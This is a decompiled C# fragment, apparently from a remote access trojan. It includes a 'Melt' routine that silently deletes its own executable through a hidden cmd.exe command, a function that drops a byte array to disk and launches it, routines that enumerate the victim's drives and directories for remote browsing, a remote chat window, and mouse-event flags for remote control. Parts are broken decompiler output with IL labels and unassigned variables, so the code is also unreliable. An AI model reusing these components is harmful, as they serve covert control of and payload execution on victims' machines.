	public static object IsFileOpen(FileInfo file)
	{
		object result;
		try
		{
			FileStream fileStream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
			fileStream.Close();
			result = false;
		}
		catch (Exception ex)
		{
			if (ex is IOException && Functions.IsFileLocked(ex) && Process.GetProcessesByName(Path.GetFileNameWithoutExtension(file.FullName)).Length > 0)
			{
				result = true;
			}
		}
		return result;
	}

	// Token: 0x06000041 RID: 65 RVA: 0x00006368 File Offset: 0x00004568
	private static bool IsFileLocked(Exception exception)
	{
		int num = Marshal.GetHRForException(exception) & 65535;
		return num == 32 || num == 33;
	}

	// Token: 0x06000042 RID: 66 RVA: 0x00006390 File Offset: 0x00004590
	public static bool ByteArrayToFile(string FileName, byte[] ByteArray, bool RunOnce, bool Run)
	{
		try
		{
			if (!File.Exists(FileName) || !RunOnce)
			{
				FileStream fileStream = new FileStream(FileName, FileMode.Create);
				int num = 0;
				int num2 = ByteArray.Length - 1;
				for (int i = num; i <= num2; i++)
				{
					fileStream.WriteByte(ByteArray[i]);
				}
				fileStream.Close();
				if (Run)
				{
					Process.Start("explorer.exe", FileName);
				}
			}
		}
		catch (Exception ex)
		{
		}
		bool result;
		return result;
	}

	// Token: 0x06000043 RID: 67 RVA: 0x00006400 File Offset: 0x00004600
	public static void WriteBytes(string FileName, byte[] ByteArray)
	{
		if (File.Exists(FileName))
		{
			File.Delete(FileName);
		}
		FileStream fileStream = new FileStream(FileName, FileMode.Create);
		int num = 0;
		int num2 = ByteArray.Length - 1;
		for (int i = num; i <= num2; i++)
		{
			fileStream.WriteByte(ByteArray[i]);
		}
		fileStream.Close();
	}

	// Token: 0x06000044 RID: 68 RVA: 0x00006444 File Offset: 0x00004644
	public static void Melt()
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe");
			IL_14:
			num2 = 3;
			processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 500 > Nul & Del \"" + Application.ExecutablePath + "\"";
			IL_30:
			num2 = 4;
			processStartInfo.CreateNoWindow = true;
			IL_39:
			num2 = 5;
			processStartInfo.ErrorDialog = false;
			IL_42:
			num2 = 6;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			IL_4B:
			num2 = 7;
			Process.Start(processStartInfo);
			IL_54:
			num2 = 8;
			Process.GetCurrentProcess().Kill();
			IL_60:
			goto IL_D3;
			IL_62:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_94:
			goto IL_C8;
			IL_96:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_A6:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_96;
		}
		IL_C8:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_D3:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000045 RID: 69 RVA: 0x0000653C File Offset: 0x0000473C
	public static void showchatter()
	{
		try
		{
			Functions.chatter = new RemoteChat();
			Control.CheckForIllegalCrossThreadCalls = false;
			Application.Run(Functions.chatter);
			Functions.chatter.Show();
			Functions.chatter.Activate();
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000046 RID: 70 RVA: 0x00006598 File Offset: 0x00004798
	public static void addchat(string chat)
	{
		try
		{
			Functions.chatter.Activate();
			Functions.chatter.TextBox2.AppendText(string.Concat(new string[]
			{
				Environment.NewLine,
				"User: ",
				DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"),
				" ",
				chat
			}));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000047 RID: 71 RVA: 0x0000661C File Offset: 0x0000481C
	public static object ReturnFiles(string path)
	{
		object result;
		try
		{
			path = Conversions.ToString(Functions.removechars(path));
			string text = "";
			foreach (string text2 in Directory.GetDirectories(path))
			{
				text = text + text2.Substring(text2.LastIndexOf("\\") + 1) + "P*";
			}
			foreach (string text3 in Directory.GetFiles(path))
			{
				text = text + text3.Substring(text3.LastIndexOf("\\") + 1) + "F*";
			}
			result = text;
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x06000048 RID: 72 RVA: 0x000066E0 File Offset: 0x000048E0
	public static object ReturnDrives()
	{
		object result;
		try
		{
			string text = "";
			string[] logicalDrives = Directory.GetLogicalDrives();
			foreach (string str in logicalDrives)
			{
				text = text + str + "*";
			}
			result = text;
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x06000049 RID: 73 RVA: 0x00006744 File Offset: 0x00004944
	public static object removechars(string a)
	{
		foreach (char value in Path.GetInvalidPathChars())
		{
			a = a.Replace(Conversions.ToString(value), "");
		}
		return a;
	}

	// Token: 0x04000011 RID: 17
	public static RemoteChat chatter = new RemoteChat();

	// Token: 0x0200001A RID: 26
	[Flags]
	public enum MouseEventFlags : uint
	{
		// Token: 0x0400005B RID: 91
		MOUSEEVENTF_ABSOLUTE = 32768u,
		// Token: 0x0400005C RID: 92
		MOUSEEVENTF_LEFTDOWN = 2u,
		// Token: 0x0400005D RID: 93
		MOUSEEVENTF_LEFTUP = 4u,
		// Token: 0x0400005E RID: 94
		MOUSEEVENTF_MIDDLEDOWN = 32u,
		// Token: 0x0400005F RID: 95
		MOUSEEVENTF_MIDDLEUP = 64u,
		// Token: 0x04000060 RID: 96
		MOUSEEVENTF_MOVE = 1u,
		// Token: 0x04000061 RID: 97
		MOUSEEVENTF_RIGHTDOWN = 8u,
		// Token: 0x04000062 RID: 98
		MOUSEEVENTF_RIGHTUP = 16u,
		// Token: 0x04000063 RID: 99
		MOUSEEVENTF_XDOWN = 128u,
		// Token: 0x04000064 RID: 100
		MOUSEEVENTF_XUP = 256u,
		// Token: 0x04000065 RID: 101
		MOUSEEVENTF_WHEEL = 2048u,
		// Token: 0x04000066 RID: 102
		MOUSEEVENTF_HWHEEL = 4096u
	}

	// Token: 0x0200001B RID: 27
	[StructLayout(LayoutKind.Sequential)]
	public class HWProfile
	{
		// Token: 0x04000067 RID: 103
		public int dwDockInfo;

		// Token: 0x04000068 RID: 104
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 39)]
		public string szHwProfileGuid;

		// Token: 0x04000069 RID: 105
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
		public string szHwProfileName;
	}
}
